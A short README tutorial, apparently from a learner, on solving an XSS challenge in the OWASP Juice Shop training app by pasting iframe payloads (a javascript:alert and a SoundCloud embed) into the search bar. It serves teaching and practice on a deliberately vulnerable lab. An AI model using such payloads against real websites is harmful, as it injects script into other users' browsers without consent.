# Juice Shop Master XXS attack

This documentation provides information on which unverified input is sent to a web application, allowing an attacker to execute JavaScript code in a user's browser.

## Disclaimer

This documentation is for teaching porpuses only and not ment to be used for ilegal porpuses!


## Table of Contents

- [Prerequisites](#prerequisites)
- [Quickstart](#Quickstart)


## Prerequisites

- Up and running OWASP Juice Shop

## Quickstart

1. Start up the OWASP Juice Shop

```bash
cd juice-shop
npm start
```

2. Connect to the OWASP Juice Shop via Browser

```bash
http://<localhost>:3000
```

3. Connect to the OWASP Juice Shop via Browser

```bash
http://<localhost>:3000
```

3. Find a typing field. For example the searchbar 

![insert code](/img/insert_code.png)


4. insert you code

```bash
<iframe src="javascript:alert(`xss`)">
```

Or

```bash
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```




